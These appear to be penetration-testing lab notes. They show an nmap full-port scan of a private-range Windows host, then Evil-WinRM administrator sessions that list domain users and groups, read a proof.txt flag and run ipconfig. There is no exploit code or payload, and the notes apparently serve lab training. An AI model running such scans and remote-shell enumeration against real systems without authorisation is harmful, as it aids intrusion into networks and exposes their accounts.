└─$ sudo nmap -p- 10.10.193.140 --min-rate=10000 -Pn

Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-26 16:28 JST

Nmap scan report for 10.10.193.140

Host is up (0.52s latency).

Not shown: 65531 filtered tcp ports (no-response)

PORT    STATE SERVICE

53/tcp  open  domain

135/tcp open  msrpc

139/tcp open  netbios-ssn

445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 15.85 seconds

![[└─$ sudo nmap -p- 10.10.193.140 --min-rate=10000 -Pn image.png]]

*Evil-WinRM* PS C:\Users\tom_admin\Documents> net user

User accounts for \\

\-------------------------------------------------------------------------------

Administrator            Aimee.Hunt               Carol.Webb

celia.almeda             Chelsea.Byrne            Donna.Johnson

Emily.Bishop             eric.wallows             Frank.Farrell

Georgina.Begum           Guest                    Jamie.Thomas

Jane.Booth               Janice.Turner            Joan.North

john.dorian              Kenneth.Coles            krbtgt

Lawrence.Kay             Leonard.Morris           Linda.Patel

Luke.Martin              Oliver.Gray              Sandra.Craig

Shane.Mitchell           sql_svc                  Thomas.Robinson

tom.kinney               tom_admin                web_svc

The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\tom_admin\Documents> net group /domain

![[└─$ sudo nmap -p- 10.10.193.140 --min-rate=10000 -Pn image 1.png]]

*Evil-WinRM* PS C:\Users\administrator\desktop> dir

Directory: C:\Users\administrator\desktop

Mode                LastWriteTime         Length Name

----                -------------         ------ ----

-a----        8/25/2025  10:16 PM             34 proof.txt

*Evil-WinRM* PS C:\Users\administrator\desktop> type proof.txt

edfb9dd3c66e35b00e301c4339e4b3a6

*Evil-WinRM* PS C:\Users\administrator\desktop> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:

Connection-specific DNS Suffix  . :

IPv4 Address. . . . . . . . . . . : 10.10.193.140

Subnet Mask . . . . . . . . . . . : 255.255.255.0

Default Gateway . . . . . . . . . : 10.10.193.254

![[└─$ sudo nmap -p- 10.10.193.140 --min-rate=10000 -Pn image 2.png]]